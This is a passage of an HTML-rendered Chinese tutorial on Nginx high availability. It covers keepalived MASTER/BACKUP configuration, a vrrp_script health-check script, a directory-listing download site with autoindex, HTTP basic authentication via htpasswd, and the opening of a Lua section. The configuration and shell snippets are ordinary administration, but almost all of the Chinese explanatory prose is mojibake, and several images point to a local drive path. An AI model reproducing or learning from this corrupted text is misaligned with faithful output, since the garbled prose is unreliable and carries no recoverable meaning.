smtp_connect_timeout <span class="hljs-number">30</span><br>   router_id keepalived1<br>   vrrp_skip_check_adv_addr<br>   vrrp_strict<br>   vrrp_garp_interval <span class="hljs-number">0</span><br>   vrrp_gna_interval <span class="hljs-number">0</span><br>&#125;<br><br>vrrp_instance VI_1 &#123;<br>    state MASTER<br>    <span class="hljs-keyword">interface</span> <span class="hljs-symbol">ens33</span><br>    <span class="hljs-symbol">virtual_router_id</span> <span class="hljs-symbol">51</span><br>    <span class="hljs-symbol">priority</span> <span class="hljs-symbol">100</span><br>    <span class="hljs-symbol">advert_int</span> <span class="hljs-symbol">1</span><br>    <span class="hljs-symbol">authentication</span> &#123;<br>        auth_type PASS<br>        auth_pass <span class="hljs-number">1111</span><br>    &#125;<br>    virtual_ipaddress &#123;<br>        <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.222</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœåŠ¡å™¨2</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">! Configuration File <span class="hljs-keyword">for</span> keepalived<br><br>global_defs &#123;<br>   notification_email &#123;<br>        <span class="hljs-symbol">tom@</span>itcast.cn<br>        <span class="hljs-symbol">jerry@</span>itcast.cn<br>   &#125;<br>   notification_email_from <span class="hljs-symbol">zhaomin@</span>itcast.cn<br>   smtp_server <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.1</span><br>   smtp_connect_timeout <span class="hljs-number">30</span><br>   router_id keepalived2<br>   vrrp_skip_check_adv_addr<br>   vrrp_strict<br>   vrrp_garp_interval <span class="hljs-number">0</span><br>   vrrp_gna_interval <span class="hljs-number">0</span><br>&#125;<br><br>vrrp_instance VI_1 &#123;<br>    state BACKUP<br>    <span class="hljs-keyword">interface</span> <span class="hljs-symbol">ens33</span><br>    <span class="hljs-symbol">virtual_router_id</span> <span class="hljs-symbol">51</span><br>    <span class="hljs-symbol">priority</span> <span class="hljs-symbol">90</span><br>    <span class="hljs-symbol">advert_int</span> <span class="hljs-symbol">1</span><br>    <span class="hljs-symbol">authentication</span> &#123;<br>        auth_type PASS<br>        auth_pass <span class="hljs-number">1111</span><br>    &#125;<br>    virtual_ipaddress &#123;<br>        <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.222</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è®¿é—®æµ‹è¯•"><a class="markdownIt-Anchor" href="#è®¿é—®æµ‹è¯•"></a> è®¿é—®æµ‹è¯•</h3><ol><li>å¯åŠ¨keepalivedä¹‹å‰ï¼Œå’±ä»¬å…ˆä½¿ç”¨å‘½ä»¤ <code>ip a</code>,æŸ¥çœ‹192.168.200.133å’Œ192.168.200.122è¿™ä¸¤å°æœåŠ¡å™¨çš„IPæƒ…å†µã€‚</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604599529242.png" alt="1604599529242" /></p><ol start="2"><li>åˆ†åˆ«å¯åŠ¨ä¸¤å°æœåŠ¡å™¨çš„keepalived</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/local/sbin<br>./keepalived<br></code></pre></td></tr></table></figure><p>å†æ¬¡é€šè¿‡ <code>ip a</code>æŸ¥çœ‹ip</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604599616821.png" alt="1604599616821" /></p><ol start="3"><li>å½“æŠŠ192.168.200.133æœåŠ¡å™¨ä¸Šçš„keepalivedå…³é—­åï¼Œå†æ¬¡æŸ¥çœ‹ip</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604599709822.png" alt="1604599709822" /></p><p>é€šè¿‡ä¸Šè¿°çš„æµ‹è¯•ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œè™šæ‹ŸIP(VIP)ä¼šåœ¨MASTERèŠ‚ç‚¹ä¸Šï¼Œå½“MASTERèŠ‚ç‚¹ä¸Šçš„keepalivedå‡ºé—®é¢˜ä»¥åï¼Œå› ä¸ºBACKUPæ— æ³•æ”¶åˆ°MASTERå‘å‡ºçš„VRRPçŠ¶æ€é€šè¿‡ä¿¡æ¯ï¼Œå°±ä¼šç›´æ¥å‡ä¸ºMASTERã€‚VIPä¹Ÿä¼š&quot;æ¼‚ç§»&quot;åˆ°æ–°çš„MASTERã€‚</p><p>ä¸Šé¢æµ‹è¯•å’ŒNginxæœ‰ä»€ä¹ˆå…³ç³»?</p><p>æˆ‘ä»¬æŠŠ192.168.200.133æœåŠ¡å™¨çš„keepalivedå†æ¬¡å¯åŠ¨ä¸‹ï¼Œç”±äºå®ƒçš„ä¼˜å…ˆçº§é«˜äºæœåŠ¡å™¨192.168.200.122çš„ï¼Œæ‰€æœ‰å®ƒä¼šå†æ¬¡æˆä¸ºMASTERï¼ŒVIPä¹Ÿä¼š&quot;æ¼‚ç§»&quot;è¿‡å»ï¼Œç„¶åæˆ‘ä»¬å†æ¬¡é€šè¿‡æµè§ˆå™¨è®¿é—®:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.222</span>/<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604600079149.png" alt="1604600079149" /></p><p>å¦‚æœæŠŠ192.168.200.133æœåŠ¡å™¨çš„keepalivedå…³é—­æ‰ï¼Œå†æ¬¡è®¿é—®ç›¸åŒçš„åœ°å€</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604600145318.png" alt="1604600145318" /></p><p>æ•ˆæœå®ç°äº†ä»¥åï¼Œ æˆ‘ä»¬ä¼šå‘ç°è¦æƒ³è®©vipè¿›è¡Œåˆ‡æ¢ï¼Œå°±å¿…é¡»è¦æŠŠæœåŠ¡å™¨ä¸Šçš„keepalivedè¿›è¡Œå…³é—­ï¼Œè€Œä»€ä¹ˆæ—¶å€™å…³é—­keepalivedå‘¢?åº”è¯¥æ˜¯åœ¨keepalivedæ‰€åœ¨æœåŠ¡å™¨çš„nginxå‡ºç°é—®é¢˜åï¼ŒæŠŠkeepalivedå…³é—­æ‰ï¼Œå°±å¯ä»¥è®©VIPæ‰§è¡Œå¦å¤–ä¸€å°æœåŠ¡å™¨ï¼Œä½†æ˜¯ç°åœ¨è¿™æ‰€æœ‰çš„æ“ä½œéƒ½æ˜¯é€šè¿‡æ‰‹åŠ¨æ¥å®Œæˆçš„ï¼Œæˆ‘ä»¬å¦‚ä½•èƒ½è®©ç³»ç»Ÿè‡ªåŠ¨åˆ¤æ–­å½“å‰æœåŠ¡å™¨çš„nginxæ˜¯å¦æ­£ç¡®å¯åŠ¨ï¼Œå¦‚æœæ²¡æœ‰ï¼Œè¦èƒ½è®©VIPè‡ªåŠ¨è¿›è¡Œ&quot;æ¼‚ç§»&quot;ï¼Œè¿™ä¸ªé—®é¢˜è¯¥å¦‚ä½•è§£å†³?</p><h3 id="keepalivedä¹‹vrrp_script"><a class="markdownIt-Anchor" href="#keepalivedä¹‹vrrp_script"></a> keepalivedä¹‹vrrp_script</h3><p>keepalivedåªèƒ½åšåˆ°å¯¹ç½‘ç»œæ•…éšœå’Œkeepalivedæœ¬èº«çš„ç›‘æ§ï¼Œå³å½“å‡ºç°ç½‘ç»œæ•…éšœæˆ–è€…keepalivedæœ¬èº«å‡ºç°é—®é¢˜æ—¶ï¼Œè¿›è¡Œåˆ‡æ¢ã€‚ä½†æ˜¯è¿™äº›è¿˜ä¸å¤Ÿï¼Œæˆ‘ä»¬è¿˜éœ€è¦ç›‘æ§keepalivedæ‰€åœ¨æœåŠ¡å™¨ä¸Šçš„å…¶ä»–ä¸šåŠ¡ï¼Œæ¯”å¦‚Nginx,å¦‚æœNginxå‡ºç°å¼‚å¸¸äº†ï¼Œä»…ä»…keepalivedä¿æŒæ­£å¸¸ï¼Œæ˜¯æ— æ³•å®Œæˆç³»ç»Ÿçš„æ­£å¸¸å·¥ä½œçš„ï¼Œå› æ­¤éœ€è¦æ ¹æ®ä¸šåŠ¡è¿›ç¨‹çš„è¿è¡ŒçŠ¶æ€å†³å®šæ˜¯å¦éœ€è¦è¿›è¡Œä¸»å¤‡åˆ‡æ¢ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç¼–å†™è„šæœ¬å¯¹ä¸šåŠ¡è¿›ç¨‹è¿›è¡Œæ£€æµ‹ç›‘æ§ã€‚</p><p>å®ç°æ­¥éª¤:</p><ol><li>åœ¨keepalivedé…ç½®æ–‡ä»¶ä¸­æ·»åŠ å¯¹åº”çš„é…ç½®åƒ</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">vrrp_script</span> è„šæœ¬åç§°<br>&#123;<br>    <span class="hljs-attribute">script</span> <span class="hljs-string">&quot;è„šæœ¬ä½ç½®&quot;</span><br>    interval <span class="hljs-number">3</span> <span class="hljs-comment">#æ‰§è¡Œæ—¶é—´é—´éš”</span><br>    weight -<span class="hljs-number">20</span> <span class="hljs-comment">#åŠ¨æ€è°ƒæ•´vrrp_instanceçš„ä¼˜å…ˆçº§</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>ç¼–å†™è„šæœ¬</li></ol><p>ck_nginx.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>num=`ps -C nginx --no-header | <span class="hljs-built_in">wc</span> -l`<br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$num</span> -eq 0 ];<span class="hljs-keyword">then</span><br> /usr/local/nginx/sbin/nginx<br> <span class="hljs-built_in">sleep</span> 2<br> <span class="hljs-keyword">if</span> [ `ps -C nginx --no-header | <span class="hljs-built_in">wc</span> -l` -eq 0 ]; <span class="hljs-keyword">then</span><br>  killall keepalived<br> <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>Linux pså‘½ä»¤ç”¨äºæ˜¾ç¤ºå½“å‰è¿›ç¨‹ (process) çš„çŠ¶æ€ã€‚</p><p>-C(command) :æŒ‡å®šå‘½ä»¤çš„æ‰€æœ‰è¿›ç¨‹</p><p>â€“no-header æ’é™¤æ ‡é¢˜</p><ol start="3"><li>ä¸ºè„šæœ¬æ–‡ä»¶è®¾ç½®æƒé™</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">755</span> ck_nginx.sh<br></code></pre></td></tr></table></figure><ol start="4"><li>å°†è„šæœ¬æ·»åŠ åˆ°</li></ol><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">vrrp_script ck_nginx &#123;<br>   script <span class="hljs-string">&quot;/etc/keepalived/ck_nginx.sh&quot;</span> #æ‰§è¡Œè„šæœ¬çš„ä½ç½®<br>   <span class="hljs-built_in">int</span>erval <span class="hljs-number">2</span>#æ‰§è¡Œè„šæœ¬çš„å‘¨æœŸï¼Œç§’ä¸ºå•ä½<br>   weight <span class="hljs-number">-20</span>#æƒé‡çš„è®¡ç®—æ–¹å¼<br>&#125;<br>vrrp_instance VI_1 &#123;<br>    state MASTER<br>    <span class="hljs-keyword">interface</span> <span class="hljs-symbol">ens33</span><br>    <span class="hljs-symbol">virtual_router_id</span> <span class="hljs-symbol">10</span><br>    <span class="hljs-symbol">priority</span> <span class="hljs-symbol">100</span><br>    <span class="hljs-symbol">advert_int</span> <span class="hljs-symbol">1</span><br>    <span class="hljs-symbol">authentication</span> &#123;<br>        auth_type PASS<br>        auth_pass <span class="hljs-number">1111</span><br>    &#125;<br>    virtual_ipaddress &#123;<br>        <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.111</span><br>    &#125;<br>    track_script &#123;<br>      ck_nginx<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="5"><li>å¦‚æœæ•ˆæœæ²¡æœ‰å‡ºæ¥ï¼Œå¯ä»¥ä½¿ç”¨ <code>tail -f /var/log/messages</code>æŸ¥çœ‹æ—¥å¿—ä¿¡æ¯ï¼Œæ‰¾å¯¹åº”çš„é”™è¯¯ä¿¡æ¯ã€‚</li><li>æµ‹è¯•</li></ol><p>é—®é¢˜æ€è€ƒ:</p><p>é€šå¸¸å¦‚æœmasteræœåŠ¡æ­»æ‰åbackupä¼šå˜æˆmasterï¼Œä½†æ˜¯å½“masteræœåŠ¡åˆå¥½äº†çš„æ—¶å€™ masteræ­¤æ—¶ä¼šæŠ¢å VIPï¼Œè¿™æ ·å°±ä¼šå‘ç”Ÿä¸¤æ¬¡åˆ‡æ¢å¯¹ä¸šåŠ¡ç¹å¿™çš„ç½‘ç«™æ¥è¯´æ˜¯ä¸å¥½çš„ã€‚æ‰€ä»¥æˆ‘ä»¬è¦åœ¨é…ç½®æ–‡ä»¶åŠ å…¥ nopreempt éæŠ¢å ï¼Œä½†æ˜¯è¿™ä¸ªå‚æ•°åªèƒ½ç”¨äºstate ä¸ºbackupï¼Œæ•…æˆ‘ä»¬åœ¨ç”¨HAçš„æ—¶å€™æœ€å¥½master å’Œbackupçš„stateéƒ½è®¾ç½®æˆbackup è®©å…¶é€šè¿‡priorityæ¥ç«äº‰ã€‚</p><h1 id="nginxåˆ¶ä½œä¸‹è½½ç«™ç‚¹"><a class="markdownIt-Anchor" href="#nginxåˆ¶ä½œä¸‹è½½ç«™ç‚¹"></a> Nginxåˆ¶ä½œä¸‹è½½ç«™ç‚¹</h1><p>é¦–å…ˆæˆ‘ä»¬å…ˆè¦æ¸…æ¥šä»€ä¹ˆæ˜¯ä¸‹è½½ç«™ç‚¹?</p><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸ªç½‘ç«™<code>http://nginx.org/download/</code>è¿™ä¸ªæˆ‘ä»¬åˆšå¼€å§‹å­¦ä¹ Nginxçš„æ—¶å€™ç»™å¤§å®¶çœ‹è¿‡è¿™æ ·çš„ç½‘ç«™ï¼Œè¯¥ç½‘ç«™ä¸»è¦å°±æ˜¯ç”¨æ¥æä¾›ç”¨æˆ·æ¥ä¸‹è½½ç›¸å…³èµ„æºçš„ç½‘ç«™ï¼Œå°±å«åšä¸‹è½½ç½‘ç«™ã€‚</p><p><img src="F:%5C%E4%B8%8A%E8%AF%BE%E5%86%85%E5%AE%B9%5Cdoc%5CNginx%5CNginx%5Cassets%5C1583825943945.png" alt="1583825943945" /></p><p>å¦‚ä½•åˆ¶ä½œä¸€ä¸ªä¸‹è½½ç«™ç‚¹:</p><p>nginxä½¿ç”¨çš„æ˜¯æ¨¡å—ngx_http_autoindex_moduleæ¥å®ç°çš„ï¼Œè¯¥æ¨¡å—å¤„ç†ä»¥æ–œæ (&quot;/&quot;)ç»“å°¾çš„è¯·æ±‚ï¼Œå¹¶ç”Ÿæˆç›®å½•åˆ—è¡¨ã€‚</p><p>nginxç¼–è¯‘çš„æ—¶å€™ä¼šè‡ªåŠ¨åŠ è½½è¯¥æ¨¡å—ï¼Œä½†æ˜¯è¯¥æ¨¡å—é»˜è®¤æ˜¯å…³é—­çš„ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸‹æ¥æŒ‡ä»¤æ¥å®Œæˆå¯¹åº”çš„é…ç½®</p><p>ï¼ˆ1ï¼‰autoindex:å¯ç”¨æˆ–ç¦ç”¨ç›®å½•åˆ—è¡¨è¾“å‡º</p><table><thead><tr><th>è¯­æ³•</th><th>autoindex on|off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>autoindex off;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>ï¼ˆ2ï¼‰autoindex_exact_size:å¯¹åº”HTLMæ ¼å¼ï¼ŒæŒ‡å®šæ˜¯å¦åœ¨ç›®å½•åˆ—è¡¨å±•ç¤ºæ–‡ä»¶çš„è¯¦ç»†å¤§å°</p><p>é»˜è®¤ä¸ºonï¼Œæ˜¾ç¤ºå‡ºæ–‡ä»¶çš„ç¡®åˆ‡å¤§å°ï¼Œå•ä½æ˜¯bytesã€‚<br />æ”¹ä¸ºoffåï¼Œæ˜¾ç¤ºå‡ºæ–‡ä»¶çš„å¤§æ¦‚å¤§å°ï¼Œå•ä½æ˜¯kBæˆ–è€…MBæˆ–è€…GB</p><table><thead><tr><th>è¯­æ³•</th><th>autoindex_exact_size  on|off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>autoindex_exact_size  on;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>ï¼ˆ3ï¼‰autoindex_formatï¼šè®¾ç½®ç›®å½•åˆ—è¡¨çš„æ ¼å¼</p><table><thead><tr><th>è¯­æ³•</th><th>autoindex_format html|xml|json|jsonp;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>autoindex_format html;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>æ³¨æ„:è¯¥æŒ‡ä»¤åœ¨1.7.9åŠä»¥åç‰ˆæœ¬ä¸­å‡ºç°</p><p>ï¼ˆ4ï¼‰autoindex_localtime:å¯¹åº”HTMLæ ¼å¼ï¼Œæ˜¯å¦åœ¨ç›®å½•åˆ—è¡¨ä¸Šæ˜¾ç¤ºæ—¶é—´ã€‚</p><p>é»˜è®¤ä¸ºoffï¼Œæ˜¾ç¤ºçš„æ–‡ä»¶æ—¶é—´ä¸ºGMTæ—¶é—´ã€‚<br />æ”¹ä¸ºonåï¼Œæ˜¾ç¤ºçš„æ–‡ä»¶æ—¶é—´ä¸ºæ–‡ä»¶çš„æœåŠ¡å™¨æ—¶é—´</p><table><thead><tr><th>è¯­æ³•</th><th>autoindex_localtime on | off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>autoindex_localtime off;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>é…ç½®æ–¹å¼å¦‚ä¸‹:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /download&#123;<br>    <span class="hljs-attribute">root</span> /usr/local;<br>    <span class="hljs-attribute">autoindex</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">autoindex_exact_size</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">autoindex_format</span> html;<br>    <span class="hljs-attribute">autoindex_localtime</span> <span class="hljs-literal">on</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>XML/JSONæ ¼å¼[ä¸€èˆ¬ä¸ç”¨è¿™ä¸¤ç§æ–¹å¼]</p><p><img src="F:%5C%E4%B8%8A%E8%AF%BE%E5%86%85%E5%AE%B9%5Cdoc%5CNginx%5CNginx%5Cassets%5C1583828317365.png" alt="1583828317365" /></p><p><img src="F:%5C%E4%B8%8A%E8%AF%BE%E5%86%85%E5%AE%B9%5Cdoc%5CNginx%5CNginx%5Cassets%5C1583828335279.png" alt="1583828335279" /></p><h1 id="nginxçš„ç”¨æˆ·è®¤è¯æ¨¡å—"><a class="markdownIt-Anchor" href="#nginxçš„ç”¨æˆ·è®¤è¯æ¨¡å—"></a> Nginxçš„ç”¨æˆ·è®¤è¯æ¨¡å—</h1><p>å¯¹åº”ç³»ç»Ÿèµ„æºçš„è®¿é—®ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦é™åˆ¶è°èƒ½è®¿é—®ï¼Œè°ä¸èƒ½è®¿é—®ã€‚è¿™å—å°±æ˜¯æˆ‘ä»¬é€šå¸¸æ‰€è¯´çš„è®¤è¯éƒ¨åˆ†ï¼Œè®¤è¯éœ€è¦åšçš„å°±æ˜¯æ ¹æ®ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç æ¥åˆ¤å®šç”¨æˆ·æ˜¯å¦ä¸ºåˆæ³•ç”¨æˆ·ï¼Œå¦‚æœæ˜¯åˆ™æ”¾è¡Œè®¿é—®ï¼Œå¦‚æœä¸æ˜¯åˆ™æ‹’ç»è®¿é—®ã€‚</p><p>Nginxå¯¹åº”ç”¨æˆ·è®¤è¯è¿™å—æ˜¯é€šè¿‡ngx_http_auth_basic_moduleæ¨¡å—æ¥å®ç°çš„ï¼Œå®ƒå…è®¸é€šè¿‡ä½¿ç”¨&quot;HTTPåŸºæœ¬èº«ä»½éªŒè¯&quot;åè®®éªŒè¯ç”¨æˆ·åå’Œå¯†ç æ¥é™åˆ¶å¯¹èµ„æºçš„è®¿é—®ã€‚é»˜è®¤æƒ…å†µä¸‹nginxæ˜¯å·²ç»å®‰è£…äº†è¯¥æ¨¡å—ï¼Œå¦‚æœä¸éœ€è¦åˆ™ä½¿ç”¨â€“without-http_auth_basic_moduleã€‚</p><p>è¯¥æ¨¡å—çš„æŒ‡ä»¤æ¯”è¾ƒç®€å•ï¼Œ</p><p>ï¼ˆ1ï¼‰auth_basic:ä½¿ç”¨â€œ HTTPåŸºæœ¬è®¤è¯â€åè®®å¯ç”¨ç”¨æˆ·åå’Œå¯†ç çš„éªŒè¯</p><table><thead><tr><th>è¯­æ³•</th><th>auth_basic string|off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>auth_basic off;</td></tr><tr><td>ä½ç½®</td><td>http,server,location,limit_except</td></tr></tbody></table><p>å¼€å¯åï¼ŒæœåŠ¡ç«¯ä¼šè¿”å›401ï¼ŒæŒ‡å®šçš„å­—ç¬¦ä¸²ä¼šè¿”å›åˆ°å®¢æˆ·ç«¯ï¼Œç»™ç”¨æˆ·ä»¥æç¤ºä¿¡æ¯ï¼Œä½†æ˜¯ä¸åŒçš„æµè§ˆå™¨å¯¹å†…å®¹çš„å±•ç¤ºä¸ä¸€è‡´ã€‚</p><p>ï¼ˆ2ï¼‰auth_basic_user_file:æŒ‡å®šç”¨æˆ·åå’Œå¯†ç æ‰€åœ¨æ–‡ä»¶</p><table><thead><tr><th>è¯­æ³•</th><th>auth_basic_user_file file;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>http,server,location,limit_except</td></tr></tbody></table><p>æŒ‡å®šæ–‡ä»¶è·¯å¾„ï¼Œè¯¥æ–‡ä»¶ä¸­çš„ç”¨æˆ·åå’Œå¯†ç çš„è®¾ç½®ï¼Œå¯†ç éœ€è¦è¿›è¡ŒåŠ å¯†ã€‚å¯ä»¥é‡‡ç”¨å·¥å…·è‡ªåŠ¨ç”Ÿæˆ</p><p>å®ç°æ­¥éª¤:</p><p>1.nginx.confæ·»åŠ å¦‚ä¸‹å†…å®¹</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /download&#123;<br>    <span class="hljs-attribute">root</span> /usr/local;<br>    <span class="hljs-attribute">autoindex</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">autoindex_exact_size</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">autoindex_format</span> html;<br>    <span class="hljs-attribute">autoindex_localtime</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">auth_basic</span> <span class="hljs-string">&#x27;please input your auth&#x27;</span>;<br>    <span class="hljs-attribute">auth_basic_user_file</span> htpasswd;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.æˆ‘ä»¬éœ€è¦ä½¿ç”¨<code>htpasswd</code>å·¥å…·ç”Ÿæˆ</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> -y httpd-tools<br></code></pre></td></tr></table></figure><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts">htpasswd -c <span class="hljs-keyword">/usr/</span>local<span class="hljs-keyword">/nginx/</span>conf/htpasswd username <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶è®°å½•ç”¨æˆ·åå’Œå¯†ç </span><br>htpasswd -b <span class="hljs-keyword">/usr/</span>local<span class="hljs-keyword">/nginx/</span>conf/htpasswd username password <span class="hljs-comment">//åœ¨æŒ‡å®šæ–‡ä»¶æ–°å¢ä¸€ä¸ªç”¨æˆ·åå’Œå¯†ç </span><br>htpasswd -D <span class="hljs-keyword">/usr/</span>local<span class="hljs-keyword">/nginx/</span>conf/htpasswd username <span class="hljs-comment">//ä»æŒ‡å®šæ–‡ä»¶åˆ é™¤ä¸€ä¸ªç”¨æˆ·ä¿¡æ¯</span><br>htpasswd -v <span class="hljs-keyword">/usr/</span>local<span class="hljs-keyword">/nginx/</span>conf/htpasswd username <span class="hljs-comment">//éªŒè¯ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦æ­£ç¡®</span><br></code></pre></td></tr></table></figure><p><img src="F:%5C%E4%B8%8A%E8%AF%BE%E5%86%85%E5%AE%B9%5Cdoc%5CNginx%5CNginx%5Cassets%5C1583850151467.png" alt="1583850151467" /></p><p>ä¸Šè¿°æ–¹å¼è™½ç„¶èƒ½å®ç°ç”¨æˆ·åå’Œå¯†ç çš„éªŒè¯ï¼Œä½†æ˜¯å¤§å®¶ä¹Ÿçœ‹åˆ°äº†ï¼Œæ‰€æœ‰çš„ç”¨æˆ·åå’Œå¯†ç ä¿¡æ¯éƒ½è®°å½•åœ¨æ–‡ä»¶é‡Œé¢ï¼Œå¦‚æœç”¨æˆ·é‡è¿‡å¤§çš„è¯ï¼Œè¿™ç§æ–¹å¼å°±æ˜¾å¾—æœ‰ç‚¹éº»çƒ¦äº†ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¾—é€šè¿‡åå°ä¸šåŠ¡ä»£ç æ¥è¿›è¡Œç”¨æˆ·æƒé™çš„æ ¡éªŒäº†ã€‚</p><h1 id="nginxçš„æ‰©å±•æ¨¡å—"><a class="markdownIt-Anchor" href="#nginxçš„æ‰©å±•æ¨¡å—"></a> Nginxçš„æ‰©å±•æ¨¡å—</h1><p>Nginxæ˜¯å¯æ‰©å±•çš„ï¼Œå¯ç”¨äºå¤„ç†å„ç§ä½¿ç”¨åœºæ™¯ã€‚æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æ¢è®¨ä½¿ç”¨Luaæ‰©å±•Nginxçš„åŠŸèƒ½ã€‚</p><h2 id="lua"><a class="markdownIt-Anchor" href="#lua"></a> Lua</h2><h3 id="æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#æ¦‚å¿µ"></a> æ¦‚å¿µ</h3><p>Luaæ˜¯ä¸€ç§è½»é‡ã€å°å·§çš„è„šæœ¬è¯­è¨€ï¼Œç”¨æ ‡å‡†Cè¯­è¨€ç¼–å†™å¹¶ä»¥æºä»£ç å½¢å¼å¼€å‘ã€‚è®¾è®¡çš„ç›®çš„æ˜¯ä¸ºäº†åµŒå…¥åˆ°å…¶ä»–åº”ç”¨ç¨‹åºä¸­ï¼Œä»è€Œä¸ºåº”ç”¨ç¨‹åºæä¾›çµæ´»çš„æ‰©å±•å’Œå®šåˆ¶åŠŸèƒ½ã€‚</p><h3 id="ç‰¹æ€§"><a class="markdownIt-Anchor" href="#ç‰¹æ€§"></a> 